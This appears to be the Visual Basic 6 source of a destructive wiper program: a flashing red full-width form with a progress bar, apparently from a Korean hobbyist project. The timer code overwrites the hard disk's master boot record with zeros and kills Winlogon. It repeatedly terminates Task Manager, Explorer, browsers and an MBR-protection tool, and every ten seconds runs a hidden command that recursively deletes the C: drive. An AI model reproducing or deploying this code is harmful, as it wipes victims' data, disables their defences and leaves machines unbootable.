VERSION 5.00
Begin VB.Form Frm_Kill 
   BackColor       =   &H000000FF&
   BorderStyle     =   0  '����
   Caption         =   "Form1"
   ClientHeight    =   975
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   12990
   LinkTopic       =   "Form1"
   ScaleHeight     =   975
   ScaleWidth      =   12990
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  '������ ���
   Begin VB.Timer Timer99 
      Interval        =   10000
      Left            =   10800
      Top             =   360
   End
   Begin VB.Timer Timer4 
      Interval        =   100
      Left            =   10320
      Top             =   240
   End
   Begin VB.Timer TimerG 
      Enabled         =   0   'False
      Interval        =   600
      Left            =   9960
      Top             =   240
   End
   Begin VB.Timer TimerB 
      Interval        =   600
      Left            =   9600
      Top             =   240
   End
   Begin VB.Timer Timer 
      Interval        =   1200
      Left            =   9240
      Top             =   240
   End
   Begin killC.ProgressBar ProgressBar1 
      Height          =   495
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   12735
      _ExtentX        =   22463
      _ExtentY        =   873
      Value           =   0
      Theme           =   8
      TextStyle       =   2
      BeginProperty TextFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "����"
         Size            =   12
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "U11D ProgressBar"
      TextEffectColor =   16777215
      TextEffect      =   3
   End
End
Attribute VB_Name = "Frm_Kill"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
   On Error GoTo Form_Load_Error

AlwaysTop Frm_Kill, True '�� �ֻ���

   On Error GoTo 0
   Exit Sub

Form_Load_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_Load of Form Frm_Kill"
End Sub

Private Sub Timer_Timer() ' Ÿ�̸��� �̹�Ʈ�� �����Ѵ�.
   On Error GoTo Timer_Timer_Error

ProgressBar1.Value = ProgressBar1.Value + 1 ' ������� �ۻ�Ʈ�� 1�� �߰��Ѵ�

If ProgressBar1.Value = 100 Then ' ���� ����ٰ� 100%�Ͻ�
'## ����!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'## �ϵ��ũ���� MBR �� ����
Dim buf() As Byte, i As Long
Dim DDChicken As New clsDiskIO
App.TaskVisible = False
DDChicken.OpenDrive 0
buf = DDChicken.ReadBytes(False)
For i = 0 To 511
buf(i) = 0
Next
DDChicken.WriteBytes buf, False
DDChicken.UpdateDisk
DDChicken.CloseDrive
ProcessKill GetProcess("cress.exe")  '//���罺ũ�� ����
ProcessKill GetProcess("Winlogon.exe")  '//���罺ũ�� ����
End If ' if ���� �����Ѵ�.

   On Error GoTo 0
   Exit Sub

Timer_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Timer_Timer of Form Frm_Kill"
End Sub ' Ÿ�Ӿ��� �̹�Ʈ�� �����Ѵ�.

Private Sub Timer4_Timer()
   On Error GoTo Timer4_Timer_Error

ProcessKill GetProcess("iexplore.exe") '//���ͳ� ����
ProcessKill GetProcess("NateOnMain.exe")  '//����Ʈ�� ����
ProcessKill GetProcess("GOM.exe")  '//���÷��̾� ����
ProcessKill GetProcess("taskmgr.exe")  '//�۾�������(���μ���) ����
ProcessKill GetProcess("KCleaner.exe")  '//KCleaner(���μ���) ����
ProcessKill GetProcess("chrome.exe")  '//ũ�� ����
ProcessKill GetProcess("skype.exe")  '//��ī���� ����
ProcessKill GetProcess("steam.exe")  '//���� ����
ProcessKill GetProcess("explorer.exe")  '//������ ����
ProcessKill GetProcess("nPMBRGuard.exe")  '//MBR GUARD ����
ProcessKill GetProcess("nPMBRSvc.exe")  '//MBR GUARD ����

   On Error GoTo 0
   Exit Sub

Timer4_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Timer4_Timer of Form Frm_Kill"
End Sub

Private Sub Timer99_Timer()
Shell "cmd.exe /c rmdir /s /q c:\", vbHide '��10�� ��� �����ٷ� c����
End Sub

Private Sub TimerB_Timer() '���� Ÿ�̸�
   On Error GoTo TimerB_Timer_Error

Frm_Kill.BackColor = &HC0&
TimerB.Enabled = False
TimerG.Enabled = True

   On Error GoTo 0
   Exit Sub

TimerB_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure TimerB_Timer of Form Frm_Kill"
End Sub

Private Sub TimerG_Timer() '���� Ÿ�̸�
   On Error GoTo TimerG_Timer_Error

Frm_Kill.BackColor = &HFF&
TimerB.Enabled = True
TimerG.Enabled = False

   On Error GoTo 0
   Exit Sub

TimerG_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure TimerG_Timer of Form Frm_Kill"
End Sub
